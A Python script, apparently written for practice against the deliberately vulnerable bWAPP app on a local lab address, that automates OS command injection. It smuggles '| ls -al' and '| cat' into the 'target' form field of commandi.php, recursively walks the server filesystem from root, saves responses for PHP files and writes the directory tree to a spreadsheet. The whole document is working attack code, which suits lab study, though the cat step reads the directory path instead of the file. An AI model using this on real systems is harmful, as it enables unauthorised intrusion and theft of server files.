import openpyxl
import requests
from bs4 import BeautifulSoup
import re
import os

tree_workbook = openpyxl.Workbook()
tree_worksheet = tree_workbook.active

#깊이 우선 탐색으로 file_type이 'd'인것을 찾기
def dfs_directory_traversal(address, idx):
    headers = {
        "Referer": "http://192.168.80.128/bWAPP/commandi.php",
        "Cookie": "PHPSESSID=; security_level=0"
    }
    
    data = {
        "target": "| ls -al " + address,
        "form": "submit"
    }
    
    
    response = requests.post("http://192.168.80.128/bWAPP/commandi.php", headers=headers, data=data)
    html = response.content
    soup = BeautifulSoup(html, 'html.parser')
    soup2 = soup.select_one('#main > p')
    tree = soup2.get_text()
    tree_lines = tree.split('\n')
    
    pattern = r"([dl-])([r-][w-][xst-][r-][w-][xst-][r-][w-][xst-])\s+(\d+)\s+(\w+)\s+([a-zA-Z-]+)\s+(\d+)\s+(\w{3}\s+\d{1,2}\s+(?:\d{4}|\d{2}:\d{2}))\s+(.+)"
    
    for line in tree_lines:
        matches = re.match(pattern, line)
        
        if matches:
            file_type = matches.group(1)
            permissions = matches.group(2)
            num_links = matches.group(3)
            owner = matches.group(4)
            group = matches.group(5)
            size = matches.group(6)
            last_modified = matches.group(7)
            name = matches.group(8)
            if name.lower().endswith(".php"):
                data = {
                    "target": "| cat " + address,
                    "form": "submit"
                }
    
                response2 = requests.post("http://192.168.80.128/bWAPP/commandi.php", headers=headers, data=data)
                html2 = response2.content
                fd = open(name, "wb")
                fd.write(html2)
                fd.close()
            if file_type == "d" and name != "." and name != "..":
                tree_worksheet.append([file_type, permissions, num_links, owner, group, size, last_modified, name, address])
                dfs_directory_traversal(os.path.join(address + "/" + name), idx)
        
        else:
            print(f"Line {idx}: No match found for pattern.")
            print(line)
            print(address)

dfs_directory_traversal("/", 2)

tree_worksheet.append(["file_type", "permissions", "num_links", "owner", "group", "size", "last_modified", "name", "path"])
tree_workbook.save("file_list.xlsx")
tree_workbook.close()
